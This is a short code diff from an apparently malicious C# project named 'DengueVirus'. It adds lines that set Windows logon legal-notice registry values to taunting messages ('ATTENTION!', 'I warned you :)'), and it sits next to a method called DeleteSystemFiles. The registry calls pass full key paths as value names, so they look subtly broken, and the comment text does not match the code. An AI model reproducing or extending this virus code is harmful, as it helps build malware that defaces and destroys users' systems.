@@ -237,7 +237,10 @@ namespace DengueVirus.Spicy
                 catch (Exception)
                 { }
             }
-
+            // after that, write "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\legalnoticecaption","ATTENTION!", "REG_SZ"
+            //"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\legalnoticetext","Your PC has been wrecked by Bolbi!", "REG_SZ"
+            Microsoft.Win32.Registry.LocalMachine.SetValue("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\legalnoticecaption", "ATTENTION!", Microsoft.Win32.RegistryValueKind.String);
+            Microsoft.Win32.Registry.LocalMachine.SetValue("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\legalnoticetext", "I warned you :)", Microsoft.Win32.RegistryValueKind.String);
         }
         public static void DeleteSystemFiles()
         {
